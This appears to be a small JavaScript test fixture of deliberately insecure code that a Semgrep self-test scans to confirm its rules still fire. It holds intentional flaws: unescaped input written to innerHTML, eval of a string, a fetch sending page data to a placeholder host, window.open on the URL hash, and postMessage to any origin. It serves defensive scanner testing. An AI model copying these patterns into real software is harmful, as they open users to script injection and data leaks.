// Deliberately BAD code. It is never shipped or run. The Semgrep self test scans this file and
// fails if any rule does not fire, so the scanner can never go blind without notice.
function showName(name) { document.getElementById("out").innerHTML = "<b>" + name + "</b>"; }
function runText(code) { return eval(code); }
fetch("https://example.invalid/?d=" + window.data);
localStorage.setItem("key", "value");
window.open(location.hash);
window.parent.postMessage("hello", "*");
